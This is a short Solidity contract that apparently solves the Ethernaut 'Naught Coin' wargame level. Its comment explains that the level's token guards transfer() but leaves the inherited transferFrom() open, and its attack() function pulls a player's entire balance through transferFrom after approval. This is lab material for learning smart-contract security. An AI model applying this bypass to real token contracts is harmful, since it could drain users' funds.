// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {ERC20} from 'openzeppelin-contracts-08/token/ERC20/ERC20.sol';


contract NaughtCoinAttack2 {

    /**
    The viticm's contract inherited ERC20, which transfer token have two way: one is transfer(),another is transferFrom.
    Although the transfer has add the check logic,but transferFrom is public in its parent contract, so anyone can call transferFrom function.
    So the attack logic:
        1: approve other contract,such as this attackContract have the rights to transfer token.
        2: Make this attack contract call transferFrom() function to transfer all the plaer's ERC20 token to this address.
        3: So the attacke can transfer the token no matter what function, because there are no check for the attack contract.
    
     */

    function attack(address token,address player) external {
            ERC20(token).transferFrom(player,address(this),ERC20(token).balanceOf(player));

    }
 
}
